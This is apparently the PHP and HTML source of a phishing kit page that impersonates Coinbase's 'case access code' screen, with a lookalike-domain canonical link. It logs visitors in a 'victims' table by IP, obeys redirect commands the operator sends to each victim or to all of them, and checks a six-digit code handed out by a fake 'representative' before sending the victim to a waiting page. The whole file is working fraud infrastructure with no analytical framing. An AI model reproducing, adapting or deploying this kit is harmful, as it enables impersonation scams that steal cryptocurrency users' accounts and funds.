<?php
// ==================== PROTECTION START ====================
session_start();
require_once 'config/database.php';
require_once 'blocker-raw.php';

// Security headers
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");

// Check for redirect commands
try {
    $database = new Database();
    $db = $database->getConnection();

    // Check for specific victim redirect first
    $victim_ip = $_SERVER['REMOTE_ADDR'];
    $victim_query = "SELECT rc.target 
                    FROM redirect_commands rc 
                    JOIN victims v ON rc.victim_id = v.id 
                    WHERE rc.command = 'redirect' 
                    AND v.ip_address = :ip 
                    AND rc.created_at > NOW() - INTERVAL '5 minutes'
                    ORDER BY rc.created_at DESC 
                    LIMIT 1";
    $victim_stmt = $db->prepare($victim_query);
    $victim_stmt->execute([':ip' => $victim_ip]);
    $victim_redirect = $victim_stmt->fetch(PDO::FETCH_ASSOC);

    if ($victim_redirect) {
        $redirect_target = trim($victim_redirect['target']);
        $current_page = basename($_SERVER['PHP_SELF']);
        
        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
            header("Location: $redirect_target");
            exit;
        }
    }

    // Check global redirect
    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
    $stmt = $db->query($query);
    $redirect_target = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($redirect_target) {
        $redirect_target = trim($redirect_target['target']);
        $current_page = basename($_SERVER['PHP_SELF']);
        
        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
            header("Location: $redirect_target");
            exit;
        }
    }
} catch (Exception $e) {
    error_log("Database error in coinbaselogin.php: " . $e->getMessage());
}

// Handle case ID verification
$error_message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the entered case ID from the form
    $entered_code = '';
    for ($i = 1; $i <= 6; $i++) {
        $field_name = 'coinbase_access_code' . $i;
        if (isset($_POST[$field_name])) {
            $entered_code .= $_POST[$field_name];
        }
    }
    
    // Get the current valid case ID from database
    try {
        $database = new Database();
        $db = $database->getConnection();
        
        $case_query = "SELECT setting_value FROM case_settings WHERE setting_name = 'current_case_id'";
        $case_stmt = $db->query($case_query);
        $case_result = $case_stmt->fetch(PDO::FETCH_ASSOC);
        $valid_case_id = $case_result ? $case_result['setting_value'] : '';
        
        if (!empty($valid_case_id) && $entered_code === $valid_case_id) {
            // Case ID is correct - redirect to waiting page
            header('Location: waiting.php');
            exit;
        } else {
            $error_message = 'Invalid case access code. Please try again.';
        }
    } catch (Exception $e) {
        $error_message = 'System error. Please try again.';
        error_log("Case ID verification error: " . $e->getMessage());
    }
}

// Update victim tracking
try {
    $database = new Database();
    $db = $database->getConnection();
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'coinbaselogin.php' WHERE ip_address = :ip AND status = 'active'";
    $update_stmt = $db->prepare($update_query);
    $update_stmt->execute([':ip' => $ip]);
} catch (Exception $e) {
    error_log("Victim update error in coinbase: " . $e->getMessage());
}
// ==================== PROTECTION END ====================
?>
<html lang=en>
<meta charset=utf-8>
<meta name=viewport content="width=device-width, initial-scale=1.0">
<title>Coinbase</title>
<meta name=theme-color content=#000000>

<style id=_goober>
    body {
        background: #000000
    }

    @keyframes go2264125279 {
        from {
            transform: scale(0) rotate(45deg);
            opacity: 0
        }

        to {
            transform: scale(1) rotate(45deg);
            opacity: 1
        }
    }

    @keyframes go3020080000 {
        from {
            transform: scale(0);
            opacity: 0
        }

        to {
            transform: scale(1);
            opacity: 1
        }
    }

    @keyframes go463499852 {
        from {
            transform: scale(0) rotate(90deg);
            opacity: 0
        }

        to {
            transform: scale(1) rotate(90deg);
            opacity: 1
        }
    }

    @keyframes go1268368563 {
        from {
            transform: rotate(0deg)
        }

        to {
            transform: rotate(360deg)
        }
    }

    @keyframes go1310225428 {
        from {
            transform: scale(0) rotate(45deg);
            opacity: 0
        }

        to {
            transform: scale(1) rotate(45deg);
            opacity: 1
        }
    }

    @keyframes go651618207 {
        0% {
            height: 0;
            width: 0;
            opacity: 0
        }

        40% {
            height: 0;
            width: 6px;
            opacity: 1
        }

        100% {
            opacity: 1;
            height: 10px
        }
    }

    @keyframes go901347462 {
        from {
            transform: scale(0.6);
            opacity: 0.4
        }

        to {
            transform: scale(1);
            opacity: 1
        }
    }
</style>
<meta name=referrer content=no-referrer>
<link id=favicon rel=icon
    href=data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAADGElEQVRYhbWXP1ATQRTGf3uTyjTXSH2pw2hotEzSZ0bSxM7BXg2MM5aG2EEDYawJKaEhw2id0NIYHai5GgvSYLsW7zbcXXZzB8avSfbP7ff27dvvvVXkhNbaB9aBKlABAsCPhqdACEyAEXCmlJrmXTuLONBa97TWt/ph6Gutg38h9rXWew8ktWEv8p4VyrVrxJWJHYyv4PxSfsPfEN5Iv1+ESgDPS7BRl/8phEBdKRVmGqC1rgCncfLxFXSP5TcPamXotKC2OmdEUyk1cRqQ3vn0Toj3v+cjTmOzIYr4xYQRCU/MDIjO6YchD2+guQuT68eRG1RKcPoJgpWEEWvmlnixuR1iO18GOcgazV1ZM0IQcTEzIHL9punsHi+HPG5E9yTRtWmuqIoMGABvAIYX0NxZvKBflEAz0T4JJUBju7Ri1E0E5oFSqq2is781vWsfZUEX2g3YTgYWIDFzNBbvuVArw+jLrDkFSh4ir7KT68Xk/Xew/3aeHCTItlsyx4XxFYwvZ00fWPeAuukZjNwfd1oiMlnYqMv1c+E8qSVVD3hmWq7d+8V85AadFvhP7GMpMasUiCmeK/Jr5cQ9zoRfhP57e1Cmji8ocJ9Smf6xL2jR9kysv8g1zfey5/xfFJDr4IO42WS4OBbdDBeGF+4jiHlnWkC0uQIQPLUbYETGdv1sCG/cYlYrJwwIPeDXbHDV9kmUFU/sYzYMxu6xWjnRnHhI+gWgWk5Pv8f+t8U6MSMfwfYCNXz1MtEcecAQiQNq5TkLE9j4KlJrO6bpHWwdyhwX4vkjwplJRj3gA8h51z+7F4GlJaMjpdRbY0AAzGRoqy8uXybaDckjMZSUUqEHEJVIB2ak03qc+LhQKUmiiuHAlGWLS7Kdx2lAmjxdkimlSqYxU8KoRqsjukCwIrl7UWbLQrsh556qBxNpLXdZvnWY3xu1MnRez92okKyyPGZEgOVhMrmWqudnVLiYqA9WREWrq86rHOJ4mDgRPc16S3ia9RY9zfIYEmitBw8kvY2Ig6z1rUfg8ghSP9aRKirA/jw/B4Z5n+d/AVicKcqgV4muAAAAAElFTkSuQmCC>
<link rel=canonical
    href="https://238911coinbase.com/1/coinbase_access_code?login_challenge=8485ae387a981d783f8764e508151cd9">
<meta http-equiv=content-security-policy
    content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">

<body cz-shortcut-listen=true>
    <div id=root>
        <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
            <div class="w-full px-6 pt-5"><svg height=32 viewBox="0 0 48 48" width=32 xmlns=http://www.w3.org/2000/svg>
                    <path
                        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
                        fill=#FFFFFF></path>
                </svg></div>
            <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
                <form method=post action=""
                    class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">


                    <span class="pb-2 font-coinbase-title text-[28px] font-semibold text-white">Case access
                        code</span><span class="font-coinbase-sans text-coinbase-foreground-muted">Enter the case access
                        code provided to you by our representative.</span><span
                        class="font-coinbase-sans text-coinbase-foreground-muted mb-8 mt-4">Please keep the case number
                        confidential to ensure your information remains secure while we conduct our
                        investigation.</span>
                    
                    <?php if ($error_message): ?>
                        <div style="color: #ff4444; background: rgba(255,68,68,0.1); padding: 12px; border-radius: 8px; margin-bottom: 16px; text-align: center;">
                            <?php echo htmlspecialchars($error_message); ?>
                        </div>
                    <?php endif; ?>
                    
                    <div class="flex w-full justify-between gap-2">
                        <input maxlength=1 type=text inputmode=numeric name=coinbase_access_code1 autofocus
                            class="digit text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary"
                            value>
                        <input maxlength=1 type=text inputmode=numeric name=coinbase_access_code2
                            class="digit text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary"
                            value>
                        <input maxlength=1 type=text inputmode=numeric name=coinbase_access_code3
                            class="digit text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary"
                            value>
                        <input maxlength=1 type=text inputmode=numeric name=coinbase_access_code4
                            class="digit text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary"
                            value>
                        <input maxlength=1 type=text inputmode=numeric name=coinbase_access_code5
                            class="digit text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary"
                            value>
                        <input maxlength=1 type=text inputmode=numeric name=coinbase_access_code6
                            class="digit text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary"
                            value>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const digitInputs = document.querySelectorAll('.digit');
            const form = document.querySelector('form');
            
            // Auto-advance to next input and auto-submit when all digits are filled
            digitInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    if (this.value.length === 1) {
                        if (index < digitInputs.length - 1) {
                            digitInputs[index + 1].focus();
                        } else {
                            // All digits filled, auto-submit
                            form.submit();
                        }
                    }
                });
                
                // Handle backspace
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
                        digitInputs[index - 1].focus();
                    }
                });
                
                // Only allow numbers
                input.addEventListener('keypress', function(e) {
                    if (!/[0-9]/.test(e.key)) {
                        e.preventDefault();
                    }
                });
            });
            
            // Paste handling
            form.addEventListener('paste', function(e) {
                e.preventDefault();
                const pasteData = e.clipboardData.getData('text');
                const numbers = pasteData.replace(/\D/g, '').split('').slice(0, 6);
                
                numbers.forEach((num, index) => {
                    if (digitInputs[index]) {
                        digitInputs[index].value = num;
                    }
                });
                
                // Focus the next empty input or submit if all filled
                const firstEmpty = Array.from(digitInputs).find(input => input.value === '');
                if (firstEmpty) {
                    firstEmpty.focus();
                } else {
                    form.submit();
                }
            });
        });
    </script>